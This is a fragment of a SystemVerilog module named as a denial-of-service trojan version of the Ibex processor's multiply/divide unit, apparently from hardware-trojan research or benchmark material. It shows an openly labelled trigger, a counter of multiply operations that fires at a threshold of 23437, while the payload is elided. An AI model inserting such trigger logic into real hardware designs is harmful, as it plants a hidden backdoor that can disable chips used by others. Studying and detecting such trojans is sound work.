...
module ibex_multdiv_slow_trojan_DoS
(
  input  logic             clk_i,
  input  logic             rst_ni,
  ...
  output logic             valid_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=23437)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 23437;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (mult_en_i) trojan_counter <= trojan_counter + 1;
